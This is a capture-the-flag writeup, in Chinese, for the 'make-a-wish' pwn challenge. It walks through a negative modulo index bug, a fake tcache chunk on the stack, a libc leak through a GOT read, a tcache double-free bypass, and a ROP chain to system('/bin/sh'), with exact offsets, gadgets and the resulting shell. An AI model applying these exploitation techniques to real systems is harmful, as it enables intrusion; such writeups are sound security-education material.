# make-a-wish — WRITEUP

**Flag: `K17{my_f4v0ur1t3_fl4v0ur_15_k1w1_p1n34ppl3_btw}`**

远端：`nc chal.secso.cc 4004`。非 PIE + partial RELRO（GOT 可写），
镜像 `debian:13.4-slim` → glibc 2.41，flag 在容器 `/flag`。

## 唯一的洞：`idx % 5` 是 C 语义

`create()` / `delete()` 都拿 `idx % 5` 当数组下标：

```c
int i = idx % 5;          /* idx < 0 时余数为负！ */
array[i] = malloc(0x90);  /* create */
fgets(array[i], 0x90, stdin);
...
free(array[i]); array[i] = 0;   /* delete */
```

于是 `idx = -4..-1` 会写到 `wishes[]` **前面**的 main 栈帧上：

| 下标 | 地址 | main 里的变量 |
|------|------|---------------|
| -1 | rbp-0x68 | `nread`（read() 的返回值） |
| **-2** | **rbp-0x70** | **`p`** —— 全程序到处 `printf("%s", p)` 的那个指针 |
| -3 / -4 | rbp-0x78 / -0x80 | 未初始化 |

`p` 是 `name_buf + 第一个空格的下标 + 1`，也就是说 **`p` 指向我们 30 字节名字里
空格后面那个位置**。main 的布局：

```
name_buf (30B, 我们控制)  = rbp-0x30
first  (第一个词, %s 常见) = rbp-0x08
p                         = rbp-0x70
```

## 第一步：把伪造的 chunk 放到栈上，让 tcache 咬钩

把**空格放到偏移 15**，于是 `p = name_buf+16`（16 字节对齐 —— `free()` 会查对齐！），
再把 `name_buf+8..15` 当成 chunk header：

```
name_buf+8 .. +15 : a1 00 00 00 00 00 00 00   <- size = 0xa1 -> chunk 0xa0 -> tcache bin 8
name_buf+16       : <- p，即"chunk 指针"
```

**关键细节**：偏移 15 那个字节既是空格又是 size 字段最高位。`split()` 会把空格
**改写成 `\0`**，所以 size 读出来正好是干净的 `0xa1`（否则高位被 0x20 污染，
chunk 尺寸变成天文数字，free 会走到 unsorted bin 合并然后段错误）。
名字的换行必须落在 p 的范围内（否则 `strchr(p,'\n')` 返回 NULL，
`*NULL = 0` 直接炸）。

然后：

```
delete(-2)  -> free(name_buf+16)   # size 合法、对齐合法、不在 tcache 里 -> 直接挂进 tcache[0xa0]
create(-2)  -> malloc(0x90) 返回 name_buf+16，fgets 把 0x8f 字节糊到 main 栈帧上
```

写入的偏移（相对 `p` = rbp-0x20）：

```
+0x18  first        (rbp-0x08)  <- create/delete 的 "Mr. %s" 会打印它 => 任意读
+0x20  saved rbp    (rbp+0x00)
+0x28  return addr  (rbp+0x08)  => ROP
```

## 第二步：先泄漏 libc

第一阶段只写 0x20 字节，**故意不碰返回地址**，程序继续跑；把 `first` 指到
`read@got`（0x404048），下一次 `create` 那句
`printf("which number do you love Mr. %s?", first)` 就是一个任意读：

```
read@libc = 0x7f1e04c63ed0  ->  base = 0x7f1e04b60000   (页对齐 = libc 版本对上了)
```

libc 用的是 Debian trixie 的 `libc6_2.41-12+deb13u3`，直接从
`deb.debian.org` 拉 `.deb` 取的偏移：
`read=0x103ed0`、`pop rdi; ret=0x2a145`、`"/bin/sh"=0x1a5ea4`。

## 第三步：ROP

同一个伪造 chunk **再 free 一次**就能再用一次栈写：size 字段在 `name_buf+8`，
在我们的写入起点**下面**，没被破坏；而 glibc 的 tcache double-free 检测是看
`e->key == tcache_key`，那个 key 刚好被第一阶段的载荷覆盖掉了，于是检查直接放行。

```
delete(-2) -> 再次入 tcache
create(-2) -> 又拿到 name_buf+16，写入完整 ROP
选 "3. Exit" -> main 的 leave; ret 弹进我们的链子
```

```
[rbp+0x08] pop rdi ; ret      (libc+0x2a145)
[rbp+0x10] "/bin/sh"          (libc+0x1a5ea4)
[rbp+0x18] ret                (libc+0x2a146 —— 就是 pop rdi 后面那个 0xc3)
[rbp+0x20] system@plt         (0x401130)
```

```
uid=1000 gid=1000 groups=1000
---
K17{my_f4v0ur1t3_fl4v0ur_15_k1w1_p1n34ppl3_btw}
```

## 踩坑记录

- **栈对齐**：不带那个多余的 `ret` 时，`system` 入口处 `rsp ≡ 0 (mod 16)`，
  glibc 里的 `movaps` 直接崩 —— 症状是 ROP 跑完什么 shell 都没有，连接静默死掉。
  `pop rdi; ret` 后面紧跟的那个 `0xc3`（0x2a146）正好当对齐补充。
- **同步 marker**：开场问候会 `printf("%s", p)`，而 `p` 指向名字后面那片**没初始化的栈**，
  会一路打印到第一个 `\0`。里面完全可能混进 `">> "` 之类的字节，按提示符同步会错位，
  所以脚本改成按菜单文本（`3. Exit.`）同步。
- **本地调试**：`qemu-x86_64-static` 下 `system("clear")` 会把模拟进程卡死，
  本地验证时把 0x401689 那条 `call system` patch 成 5 个 nop 即可（`chal_noclear`）。
  本地 libc 直接拿 Debian 的 `.deb` 解出来，和远端严丝合缝。
